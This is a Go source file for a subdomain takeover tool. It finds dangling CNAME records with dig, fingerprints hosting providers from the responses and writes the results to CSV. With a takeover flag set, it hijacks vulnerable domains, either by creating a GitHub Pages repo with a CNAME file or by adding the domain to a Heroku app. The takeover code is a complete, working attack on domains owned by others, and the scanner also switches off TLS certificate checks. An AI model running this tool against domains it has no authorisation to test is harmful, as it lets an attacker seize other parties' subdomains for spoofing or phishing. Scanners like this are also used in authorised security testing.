package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"sync"
	"time"

	"golang.org/x/oauth2"

	heroku "github.com/bgentry/heroku-go"
	"github.com/gocarina/gocsv"
	"github.com/google/go-github/github"
)

var tkoRes []tkosubsResult //global variable to store all the results

//Defining the flag variables
var (
	domainsFilePath = flag.String("domains", "domains.txt", "List of domains to check")
	recordsFilePath = flag.String("data", "providers-data.csv", "CSV file containing CMS providers' string for identification")
	outputFilePath  = flag.String("output", "output.csv", "Output file to save the results")
	takeOver        = flag.Bool("takeover", false, "Flag to denote if a vulnerable domain needs to be taken over or not")
	githubtoken     = flag.String("githubtoken", "", "Github personal access token")
	herokuusername  = flag.String("herokuusername", "", "Heroku username")
	herokuapikey    = flag.String("herokuapikey", "", "Heroku API key")
	herokuappname   = flag.String("herokuappname", "", "Heroku app name")
)

//Checkiferr function as a generic check for error function
func Checkiferr(e error) {
	if e != nil {
		panic(e)
	}
}

//Info function to print pretty output
func Info(format string, args ...interface{}) {
	fmt.Printf("\x1b[34;1m%s\x1b[0m\n", fmt.Sprintf(format, args...))
}

//CMS struct to define the CMS data provider file
type CMS struct {
	Name     string `csv:"name"`
	CName    string `csv:"cname"`
	String   string `csv:"string"`
	OverHTTP string `csv:"http"`
}

//tkosubsResult struct to define the results
type tkosubsResult struct {
	Domain       string
	Provider     string
	IsVulnerable bool
	IsTakenOver  bool
	RespString   string
}

//takeoversub function to decide what to do depending upon the CMS
func takeoversub(domain string, provider string) (bool, error) {
	switch provider {
	case "github":
		resGithub, err := githubcreate(domain)
		Checkiferr(err)
		return resGithub, nil
	case "heroku":
		resHeroku, err := herokucreate(domain)
		Checkiferr(err)
		return resHeroku, nil
	}
	return false, nil //for any other CMS that are not defined above, can't take over so return false with no error
}

//githubcreate function to take over dangling Github Pages
func githubcreate(domain string) (bool, error) {

	ctx := context.Background()

	// Connecting to your Github account using the Personal Access Token
	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: *githubtoken})
	tc := oauth2.NewClient(ctx, ts)
	client := github.NewClient(tc)

	repo := &github.Repository{
		Name:            github.String(domain),
		Description:     github.String("testing subdomain takeovers"),
		Private:         github.Bool(false),
		LicenseTemplate: github.String("mit"),
	}

	// Creating a repo
	repocreate, _, err := client.Repositories.Create(ctx, "", repo)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
		return false, err
	}

	reponame := *repocreate.Name
	ownername := *repocreate.Owner.Login
	refURL := *repocreate.URL
	ref := "refs/heads/master"

	// Retrieving the SHA value of the head branch
	SHAvalue, _, err := client.Repositories.GetCommitSHA1(ctx, ownername, reponame, ref, "")
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
		return false, err
	}

	opt := &github.Reference{
		Ref: github.String("refs/heads/gh-pages"),
		URL: github.String(refURL + "/git/refs/heads/gh-pages"),
		Object: &github.GitObject{
			SHA: github.String(SHAvalue),
		},
	}

	// Creating the gh-pages branch using the SHA value obtained above
	_, _, err = client.Git.CreateRef(ctx, ownername, reponame, opt)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
		return false, err
	}

	Indexpath := "index.html"
	CNAMEpath := "CNAME"
	data := "This domain is temporarily suspended"

	indexfile := &github.RepositoryContentFileOptions{
		Message: github.String("Adding the index.html page"),
		Content: []byte(data),
		Branch:  github.String("gh-pages"),
	}

	// Creating the index file with the text you want to see when the domain is taken over
	_, _, err = client.Repositories.CreateFile(ctx, ownername, reponame, Indexpath, indexfile)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
		return false, err
	}

	cnamefile := &github.RepositoryContentFileOptions{
		Message: github.String("Adding the subdomain to takeover to the CNAME file"),
		Content: []byte(domain),
		Branch:  github.String("gh-pages"),
	}

	// Creating the CNAME file with the domain that needs to be taken over
	_, _, err = client.Repositories.CreateFile(ctx, ownername, reponame, CNAMEpath, cnamefile)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
		return false, err
	}

	Info("Please check " + domain + " after a few minutes to ensure that it has been taken over..")
	return true, nil
}

//herokucreate function to take over dangling Heroku apps
func herokucreate(domain string) (bool, error) {

	// Connecting to your Heroku account using the username and the API key provided as flags
	client := heroku.Client{Username: *herokuusername, Password: *herokuapikey}

	// Adding the dangling domain as a custom domain for your appname that is retrieved from the flag
	// This results in the dangling domain pointing to your Heroku appname
	client.DomainCreate(*herokuappname, domain)

	Info("Please check " + domain + " after a few minutes to ensure that it has been taken over..")
	return true, nil
}

//scanforeachDomain function to scan for each domain being read from the domains file
func scanforeachDomain(domain string, cmsRecords []*CMS, wg *sync.WaitGroup) {

	//Doing CNAME lookups using GOLANG's net package or for that matter just doing a host on a domain
	//does not necessarily let us know about any dead DNS records. So, we need to use dig CNAME <domain> +short
	//to properly figure out if there are any dead DNS records

	cmd := exec.Command("dig", "CNAME", domain, "+short")
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	Checkiferr(err)

	//Grabbing the output from the DIG command and storing it in the cname variable
	cname := out.String()

	var tkr tkosubsResult
	var isVulnerable bool

	//Defining the transport client that we will need to curl domains
	tr := &http.Transport{
		Dial: (&net.Dialer{
			Timeout: 5 * time.Second,
		}).Dial,
		TLSHandshakeTimeout: 5 * time.Second,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
	}

	timeout := time.Duration(5 * time.Second)
	client := &http.Client{
		Transport: tr,
		Timeout:   timeout,
	}

	//Now, for each entry in the data providers file, we will check to see if the output
	//from the dig command against the current domain matches the CNAME for that data provider
	//if it matches the CNAME, we need to now check if it matches the string for that data provider
	//So, we curl it and see if it matches. At this point, we know its vulnerable
	//Next, if we have the -takeover flag set to 1, we will also try to take over the dangling subdomain

	for _, cmsRecord := range cmsRecords {

		//by default, we try to curl using https but there are some CMS that take http only
		//we specify this in the data providers file
		protocol := "https://"
		if cmsRecord.OverHTTP == "true" {
			protocol = "http://"
		}

		usesprovider, err := regexp.MatchString(cmsRecord.CName, cname) //matching for the CNAME
		Checkiferr(err)

		if usesprovider { //if it matches the CNAME, create an entry in the final output
			tkr.Domain = domain
			tkr.IsTakenOver = false
			tkr.IsVulnerable = false
			tkr.Provider = cmsRecord.Name
			tkr.RespString = cmsRecord.String

			//Heroku behaves slightly different. Even if there is a dead DNS record for Heroku
			//it would not resolve using host and you can't curl the website unlike other CMS
			//but you will find it using dig
			//So, if there is a CNAME match for heroku and can't curl it, we will assume its vulnerable
			//if its not heroku, we will try to curl and regex match the string obtained in the response with
			//the string specified in the data providers file to see if its vulnerable or not

			response, err := client.Get(protocol + domain)
			if err != nil && cmsRecord.Name == "heroku" {
				isVulnerable = true
				tkr.RespString = "Can't CURL it but dig shows a dead DNS record"
			} else if err != nil && cmsRecord.Name != "heroku" {
				fmt.Println(err)
				panic(err)
			} else if err == nil {
				text, err := ioutil.ReadAll(response.Body)
				Checkiferr(err)

				isVulnerable, err = regexp.MatchString(cmsRecord.String, string(text))
				Checkiferr(err)
			}

			//We now know if its vulnerable or not.
			if isVulnerable {
				tkr.IsVulnerable = true

				switch *takeOver { //we know its vulnerable now. depending upon the flag to take over or not, we go forward
				case true:
					takenOver, err := takeoversub(domain, cmsRecord.Name)
					Checkiferr(err)
					if takenOver { //if successfully taken over
						tkr.IsTakenOver = true
					}
				}

			}

			tkoRes = append(tkoRes, tkr)
		}
	}
	wg.Done()
}

func main() {

	//Parsing the flags
	flag.Parse()

	//Opening the data providers file to read it
	clientsFile, err := os.OpenFile(*recordsFilePath, os.O_RDWR|os.O_CREATE, os.ModePerm)
	Checkiferr(err)
	defer clientsFile.Close()

	//Instantiating the CMS type to read all the values from the data providers file into this struct
	cmsRecords := []*CMS{}

	//Converting the data from the data providers CSV file to the CMS struct
	err = gocsv.UnmarshalFile(clientsFile, &cmsRecords)
	Checkiferr(err)

	//Opening the domains file to test each domain
	domainsFile, err := os.Open(*domainsFilePath)
	Checkiferr(err)
	defer domainsFile.Close()

	//Instantiating the bufio scanner to read the domains file
	domainsScanner := bufio.NewScanner(domainsFile)

	//For each domain being read, scan it to see if it has a dangling CNAME that can be taken over
	var wg sync.WaitGroup
	for domainsScanner.Scan() {
		wg.Add(1)
		domain := domainsScanner.Text()
		go scanforeachDomain(domain, cmsRecords, &wg) //function to scan for each domain being run in a goroutine
	}
	wg.Wait()

	//We have all the results now. Printing it out on the screen
	for _, element := range tkoRes {
		fmt.Println(element)
	}

	//Also, saving it back to a csv file
	outputFile, err := os.Create(*outputFilePath)
	Checkiferr(err)
	defer outputFile.Close()

	err = gocsv.MarshalFile(&tkoRes, outputFile)
	Checkiferr(err)

	Info("Results saved to: " + *outputFilePath)

}
